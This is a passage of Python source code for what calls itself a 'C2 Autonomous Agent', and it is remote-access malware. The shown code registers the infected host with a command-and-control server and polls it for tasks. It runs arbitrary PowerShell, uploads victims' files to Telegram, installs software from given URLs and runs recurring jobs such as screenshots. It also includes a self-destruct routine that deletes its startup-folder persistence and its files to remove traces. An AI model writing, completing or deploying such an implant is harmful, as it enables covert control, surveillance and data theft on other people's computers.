del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\C2Agent.lnk" /f /q >nul 2>&1

echo [SELF_DESTRUCT] Phase 3: Deleting files...
timeout /t 3 /nobreak >nul

REM Delete installation directory
rmdir /S /Q "{DATA_DIR.parent}" >nul 2>&1

REM Delete this batch file
del "%~f0"
'''
        
        # Write the batch script to temp
        batch_path = Path(os.environ.get('TEMP', '/tmp')) / 'cleanup_temp.bat'
        batch_path.write_text(batch_script, encoding='utf-8')
        
        cleanup_report.append("✓ Cleanup script created")
        
        # Send final goodbye message
        try:
            await send_telegram_message(
                f"💣 <b>SELF DESTRUCT EXECUTED</b>\n\n"
                f"Node: {socket.gethostname()}\n"
                f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                f"All traces have been removed. Goodbye."
            )
            cleanup_report.append("✓ Final message sent")
        except:
            pass
        
        # Execute the batch script in the background (detached)
        subprocess.Popen(
            ['cmd', '/c', str(batch_path)],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS if hasattr(subprocess, 'DETACHED_PROCESS') else subprocess.CREATE_NO_WINDOW,
            close_fds=True
        )
        
        cleanup_report.append("✓ Cleanup script launched")
        
        report = "\n".join(cleanup_report) + "\n\n💥 Self-destruct sequence initiated. Agent terminating..."
        
        # Give the report a moment to be sent back
        await asyncio.sleep(1)
        
        # Force exit (the batch script will clean up everything)
        os._exit(0)
        
    except Exception as e:
        return f"Self-destruct error: {e}", False


# =============================================================================
# TASK PROCESSOR
# =============================================================================

def detect_task_success(output: str, task_type: str, command: str) -> Tuple[bool, str]:
    """Smarter success detection based on output patterns."""
    output_lower = output.lower()
    
    # Clear failure indicators
    failure_patterns = [
        'access denied', 'permission denied', 'not found', 'error:',
        'failed', 'cannot find', 'unable to', 'exception', 'timeout'
    ]
    
    # Check for failures first
    for pattern in failure_patterns:
        if pattern in output_lower:
            # Some "not found" is actually success (e.g., searching for something that doesn't exist)
            if 'not found' in pattern and task_type == 'shell':
                # Check if it's an expected "not found" vs an error
                if 'cmdlet' in output_lower or 'command' in output_lower:
                    return False, f"Command error: {pattern}"
            else:
                return False, f"Detected failure pattern: {pattern}"
    
    # Success indicators by task type
    if task_type == 'shell':
        # Empty output for certain commands is success
        if not output.strip() or output.strip() == '(no output - command completed silently) [SUCCESS]':
            return True, "Command completed successfully (no output)"
        # Has output = generally success
        return True, "Command produced output"
    
    elif task_type == 'upload':
        if 'uploaded' in output_lower or 'file_id' in output_lower:
            return True, "File uploaded successfully"
        return False, "Upload may have failed"
    
    elif task_type == 'install':
        if 'successfully' in output_lower or 'installed' in output_lower:
            return True, "Installation successful"
        if 'already installed' in output_lower:
            return True, "Already installed"
        return False, "Installation status unclear"
    
    elif task_type == 'persistent':
        if 'started' in output_lower:
            return True, "Persistent task started"
        return True, "Task registered"
    
    return True, "Default success"


async def process_task(
    task: dict, 
    task_manager: PersistentTaskManager,
    report_callback
) -> Tuple[str, bool, Dict[str, Any]]:
    """Process a task based on type with smart success detection."""
    
    task_type = task.get('command_type', 'shell')
    command = task.get('command', '')
    reasoning = task.get('reasoning', '')
    task_id = task.get('id', '')
    goal_id = task.get('goal_id')
    
    print(f"[TASK] Type: {task_type}")
    if reasoning:
        print(f"[REASON] {reasoning[:100]}...")
    
    extra_data: Dict[str, Any] = {}
    
    # === SHELL COMMAND ===
    if task_type == 'shell':
        print(f"[CMD] {command[:100]}...")
        output, success = await execute_powershell(command)
        return output, success, extra_data
    
    # === FILE UPLOAD ===
    elif task_type == 'upload':
        try:
            data = json.loads(command)
            file_path = data.get('path', command)
        except json.JSONDecodeError:
            file_path = command
            
        output, success, tg_data = await upload_to_telegram(file_path)
        return output, success, tg_data
    
    # === SOFTWARE INSTALL ===
    elif task_type == 'install':
        try:
            data = json.loads(command)
            url = data.get('url', command)
        except json.JSONDecodeError:
            url = command
            
        output, success = await install_software(url)
        return output, success, extra_data
    
    # === START PERSISTENT TASK ===
    elif task_type == 'persistent':
        try:
            data = json.loads(command)
            
            ptask = PersistentTask(
                task_id=task_id,
                task_name=data.get('task_name', f'task_{task_id[:8]}'),
                action_type=data.get('action_type', 'screenshot'),
                interval_seconds=data.get('interval_seconds', 60),
                duration_seconds=data.get('duration_seconds', 3600),
                started_at=time.time(),
                params=data.get('params', {}),
                data_path='',
                goal_id=goal_id,
                is_running=True,
            )
            
            # Add to manager
            task_manager.add_task(ptask)
            
            # Start background loop
            loop_task = asyncio.create_task(
                run_persistent_task(task_manager, ptask, report_callback)
            )
            task_manager.running_loops[task_id] = loop_task
            
            return f"Started persistent task '{ptask.task_name}' ({ptask.action_type}) - runs every {ptask.interval_seconds}s for {ptask.duration_seconds}s", True, extra_data
            
        except Exception as e:
            return f"Failed to start persistent task: {e}", False, extra_data
    
    # === STOP PERSISTENT TASK ===
    elif task_type == 'stop_persistent':
        try:
            data = json.loads(command)
            target_task_id = data.get('task_id', '')
            
            stopped_task = task_manager.remove_task(target_task_id)
            if stopped_task:
                return f"Stopped persistent task: {stopped_task.task_name}", True, extra_data
            else:
                return f"Task not found: {target_task_id}", False, extra_data
                
        except Exception as e:
            return f"Failed to stop task: {e}", False, extra_data
    
    # === LIST PERSISTENT TASKS ===
    elif task_type == 'list_persistent':
        tasks = task_manager.list_tasks()
        if tasks:
            lines = ["Active Persistent Tasks:"]
            for t in tasks:
                remaining = t.time_remaining()
                lines.append(f"  - {t.task_name} ({t.action_type}): {int(remaining)}s remaining")
            return "\n".join(lines), True, extra_data
        else:
            return "No active persistent tasks", True, extra_data
    
    # === SELF DESTRUCT ===
    elif task_type == 'self_destruct':
        try:
            data = json.loads(command) if command else {}
            confirmed = data.get('confirm', False)
            
            if not confirmed:
                return "Self-destruct requires explicit confirmation", False, extra_data
            
            # This will not return - agent will terminate
            output, success = await self_destruct()
            return output, success, extra_data
            
        except Exception as e:
            return f"Self-destruct failed: {e}", False, extra_data
    
    else:
        return f"Unknown task type: {task_type}", False, extra_data


# =============================================================================
# UTILITIES
# =============================================================================

def get_hwid() -> str:
    hostname = socket.gethostname()
    try:
        import uuid
        mac = uuid.getnode()
        mac_str = ':'.join(('%012x' % mac)[i:i+2] for i in range(0, 12, 2))
    except Exception:
        mac_str = "unknown"
    return hashlib.sha256(f"{hostname}-{mac_str}".encode()).hexdigest()[:32]


def get_os_version() -> str:
    return f"{platform.system()} {platform.release()} ({platform.machine()})"


def is_admin() -> bool:
    if platform.system() == "Windows":
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    return os.geteuid() == 0


# =============================================================================
# HTTP HELPERS
# =============================================================================

async def http_get(url: str, headers: dict) -> Optional[dict]:
    try:
        async with httpx.AsyncClient(timeout=30) as client:
            resp = await client.get(url, headers=headers)
            resp.raise_for_status()
            return resp.json()
    except Exception as e:
        print(f"[ERROR] GET {url}: {e}")
        return None


async def http_post(url: str, headers: dict, data: dict) -> Optional[dict]:
    try:
        async with httpx.AsyncClient(timeout=30) as client:
            resp = await client.post(url, headers=headers, json=data)
            resp.raise_for_status()
            return resp.json()
    except Exception as e:
        print(f"[ERROR] POST {url}: {e}")
        return None


# =============================================================================
# MAIN AGENT
# =============================================================================

async def main():
    """Main entry point."""
    print("=" * 60)
    print("C2 Autonomous Agent v3.0 (Persistent Mode)")
    print(f"Server: {C2_SERVER}")
    print(f"Data Dir: {DATA_DIR}")
    print(f"Admin Mode: {is_admin()}")
    print("=" * 60)
    
    # Initialize task manager
    task_manager = PersistentTaskManager()
    
    # Register with C2
    hostname = socket.gethostname()
    hwid = get_hwid()
    
    node_id = None
    while node_id is None:
        result = await http_post(
            f"{C2_SERVER}/register",
            {"X-API-KEY": API_KEY, "Content-Type": "application/json"},
            {
                "hostname": hostname,
                "hwid": hwid,
                "os_version": get_os_version(),
                "is_elevated": is_admin()
            }
        )
        
        if result and "node_id" in result:
            node_id = result["node_id"]
            print(f"[REGISTERED] Node ID: {node_id}")
        else:
            print("[RETRY] Registration failed, retrying in 10s...")
            await asyncio.sleep(10)
    
    # Result reporting callback
    async def report_result(task_id: str, output: str, status: str, telegram_file_id: str = None):
        payload = {
            "task_id": task_id,
            "output": output[:15000],
            "status": status,
        }
        if telegram_file_id:
            payload["telegram_file_id"] = telegram_file_id
        
        await http_post(
            f"{C2_SERVER}/results/{node_id}",
            {"X-API-KEY": API_KEY, "Content-Type": "application/json"},
            payload
        )
    
    # Resume any persistent tasks from previous run
    for task in task_manager.list_tasks():
        print(f"[RESUME] Starting background loop for: {task.task_name}")
        loop_task = asyncio.create_task(
            run_persistent_task(task_manager, task, report_result)
        )
        task_manager.running_loops[task.task_id] = loop_task
    
    print(f"[RUNNING] Polling every {POLL_INTERVAL}s...")
    
    # Main poll loop
    while True:
        try:
            # Update ping
            result = await http_get(
                f"{C2_SERVER}/tasks/{node_id}",
                {"X-API-KEY": API_KEY}
            )
            
            if result and result.get("tasks"):
                tasks = result["tasks"]
                print(f"[POLL] Got {len(tasks)} task(s)")
                
                for task in tasks:
                    task_id = task.get("id")
                    task_type = task.get('command_type', 'shell')
                    command = task.get('command', '')
                    
                    # Process task
                    output, raw_success, extra_data = await process_task(
                        task, 
                        task_manager,
                        report_result
                    )
                    
                    # Apply smart success detection
                    smart_success, detection_reason = detect_task_success(output, task_type, command)
                    final_success = raw_success and smart_success
                    
                    # Log detection
                    if raw_success != smart_success:
                        print(f"[SMART_DETECT] Override: raw={raw_success}, smart={smart_success} - {detection_reason}")
                    
                    # Report result (unless it's a persistent task that reports later)
                    if task_type != 'persistent':
                        # Add detection context to output if there's a discrepancy
                        final_output = output
                        if not final_success and raw_success:
                            final_output += f"\n\n[SMART_DETECT]: {detection_reason}"
                        
                        await report_result(
                            task_id,
                            final_output,
                            'completed' if final_success else 'failed',
                            extra_data.get('file_id')
                        )
                        
                        status_icon = "✓" if final_success else "✗"
                        print(f"[RESULT] {task_id[:8]}... → {status_icon}")
                    else:
                        # For persistent tasks, report that it started
                        await report_result(task_id, output, 'completed')
                        
        except KeyboardInterrupt:
            print("\n[EXIT] Shutting down...")
            
            # Cancel all background tasks
            for task_id, loop_task in task_manager.running_loops.items():
                loop_task.cancel()
            
            break
        except Exception as e:
            print(f"[ERROR] {e}")
        
        await asyncio.sleep(POLL_INTERVAL)


if __name__ == "__main__":
    asyncio.run(main())
